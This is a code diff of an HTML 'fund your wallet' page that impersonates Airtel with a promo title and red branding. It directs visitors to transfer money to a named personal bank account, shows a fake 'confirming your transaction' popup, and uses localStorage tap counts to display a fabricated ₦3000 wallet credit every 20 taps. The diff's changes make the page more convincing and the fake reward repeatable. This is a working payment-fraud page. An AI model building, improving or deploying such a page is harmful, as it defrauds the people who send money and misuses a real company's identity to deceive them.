@@ -7,18 +7,19 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: white;
+      background: white;
       margin: 0;
       padding: 20px;
+      overflow-x: hidden;
     }
 
     .background {
-      position: absolute;
+      position: fixed;
       top: 50%;
       left: 50%;
       width: 300px;
       transform: translate(-50%, -50%);
-      opacity: 0.05;
+      opacity: 0.07;
       filter: blur(5px);
       z-index: 0;
       pointer-events: none;
@@ -30,14 +31,14 @@
     }
 
     .card {
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(255, 255, 255, 0.95);
       border-radius: 20px;
-      box-shadow: 0 0 10px rgba(200, 0, 0, 0.2);
+      box-shadow: 0 0 10px rgba(200, 0, 0, 0.3);
       padding: 20px;
       text-align: center;
     }
 
-    .airtel-red {
+    h2 {
       color: #d90000;
     }
 
@@ -50,7 +51,7 @@
       margin-top: 10px;
     }
 
-    .continue-btn, .fund-btn {
+    button {
       background-color: #d90000;
       color: white;
       border: none;
@@ -88,31 +89,32 @@
 <body>
   <img src="your-logo.png" class="background" />
   <div class="content">
-    <div class="card" id="amountCard">
-      <h2 class="airtel-red">Fund Your Wallet</h2>
+    <div class="card" id="amountSection">
+      <h2>Airtel Promo - Add Money</h2>
       <p>Enter amount to fund:</p>
       <input type="number" id="fundAmount" placeholder="₦1000" />
       <br />
-      <button class="continue-btn" onclick="showAccount()">Continue</button>
+      <button onclick="showAccount()">Continue</button>
     </div>
 
-    <div class="card" id="accountCard" style="display:none;">
-      <h2 class="airtel-red">Send Money To</h2>
+    <div class="card" id="accountSection" style="display:none;">
+      <h2>Send Money To</h2>
       <p><b>Account Name:</b> EMMANUEL OKWUNNA</p>
       <p><b>Bank:</b> SmartCash Payment Service Bank</p>
       <p><b>Account Number:</b> 812 489 0070</p>
-      <button class="fund-btn" onclick="handlePayment()">I Have Made Payment</button>
+      <button onclick="handlePayment()">I Have Made Payment</button>
     </div>
   </div>
 
   <div class="popup" id="popup">
     <img src="your-logo.png" alt="Airtel" />
-    <h3 class="airtel-red">Please wait...</h3>
+    <h3 style="color:#d90000;">Please wait...</h3>
     <p>We are confirming your transaction.</p>
   </div>
 
   <script>
     let tapCount = parseInt(localStorage.getItem('tapCount') || 0);
+    let creditedRounds = parseInt(localStorage.getItem('creditedRounds') || 0);
 
     function showAccount() {
       const amount = document.getElementById("fundAmount").value;
@@ -120,30 +122,29 @@
         alert("Please enter a valid amount (min ₦100)");
         return;
       }
-      document.getElementById("amountCard").style.display = "none";
-      document.getElementById("accountCard").style.display = "block";
+      document.getElementById("amountSection").style.display = "none";
+      document.getElementById("accountSection").style.display = "block";
     }
 
     function handlePayment() {
       tapCount++;
       localStorage.setItem('tapCount', tapCount);
 
-      // Show popup
       const popup = document.getElementById("popup");
       popup.classList.add("show");
 
-      // Hide popup after 3 seconds
       setTimeout(() => {
         popup.classList.remove("show");
       }, 3000);
 
-      // Optional: Auto credit wallet after 20 taps
-      if (tapCount >= 20) {
+      const newRounds = Math.floor(tapCount / 20);
+      if (newRounds > creditedRounds) {
+        const reward = (newRounds - creditedRounds) * 3000;
         const user = JSON.parse(localStorage.getItem('user')) || { balance: 0 };
-        user.balance = parseFloat(user.balance || 0) + 3000;
+        user.balance = parseFloat(user.balance || 0) + reward;
         localStorage.setItem('user', JSON.stringify(user));
-        localStorage.setItem('tapCount', 0); // reset
-        alert("₦3000 has been added to your wallet!");
+        localStorage.setItem('creditedRounds', newRounds);
+        alert(`₦${reward} added to your wallet!`);
       }
     }
   </script>
